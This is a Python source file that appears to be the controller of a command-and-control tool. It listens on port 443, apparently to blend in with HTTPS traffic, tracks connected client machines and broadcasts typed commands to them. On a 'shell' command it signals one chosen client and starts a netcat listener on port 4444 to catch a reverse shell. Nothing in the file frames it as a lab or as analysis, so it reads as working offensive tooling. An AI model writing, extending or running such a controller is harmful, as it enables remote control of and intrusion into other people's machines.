import socket
import threading
import os

# List to keep track of connected clients
connected_clients = []

def handle_client(client_socket, address):
    print(f"Connection from {address}")

    # Add the client socket to the list of connected clients
    connected_clients.append(client_socket)

    while True:
        try:
            message = client_socket.recv(1024).decode()
            if not message:
                break

            print(f"Received from {address}: {message}")
            # Perform any action based on the received message

        except ConnectionResetError:
            print(f"Connection with {address} closed.")
            break

    # Remove the client socket from the list of connected clients
    connected_clients.remove(client_socket)
    client_socket.close()
    print(f"Connection with {address} closed.")

def send_message_to_clients(message):
    # Send the same message to all connected clients
    for client_socket in connected_clients:
        try:
            client_socket.send(message.encode())
        except:
            # Remove the client socket if there is an issue sending the message
            connected_clients.remove(client_socket)

def start_server():
    host = '0.0.0.0'
    port = 443

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)

    print(f"Server listening on {host}:{port}")

    # Start a new thread to handle each client
    client_acceptor = threading.Thread(target=accept_clients, args=(server_socket,))
    client_acceptor.start()

    # Start a new thread for sending messages to clients
    message_sender = threading.Thread(target=send_messages)
    message_sender.start()

def accept_clients(server_socket):
    while True:
        client_socket, address = server_socket.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, address))
        client_handler.start()

def send_messages():
    while True:
        print(f"Number of Connected Clients: {len(connected_clients)}")
        message_to_send = input(">>>: ")

        if message_to_send.lower() == 'exit':
            # Close all client connections
            for client_socket in connected_clients:
                client_socket.close()
            # Close the server socket
            break

        # Check if the input starts with "shell"
        if message_to_send.startswith('shell'):
            # Display a list of connected clients
            print("Connected Clients:")
            for idx, client_socket in enumerate(connected_clients, 1):
                client_address = client_socket.getpeername()[0]
                print(f"{idx}. {client_address}")

            # Prompt the user to select a client
            selected_client = input("Select a client (enter the number): ")
            try:
                selected_index = int(selected_client) - 1
                if 0 <= selected_index < len(connected_clients):
                    target_ip = connected_clients[selected_index].getpeername()[0]
                    send_message_to_client(target_ip, "shell")
                    os.system("sudo nc -nvlp 4444")
                else:
                    print("Invalid client selection.")
            except ValueError:
                print("Invalid input. Please enter a number.")

        else:
            # Send the message to all clients
            send_message_to_clients(message_to_send)

def send_message_to_client(target_ip, message):
    for client_socket in connected_clients:
        client_address = client_socket.getpeername()[0]
        if client_address == target_ip:
            try:
                client_socket.send(message.encode())
            except:
                # Remove the client socket if there is an issue sending the message
                connected_clients.remove(client_socket)
            break  # Stop iterating after sending the message to the specified client

if __name__ == "__main__":
    start_server()
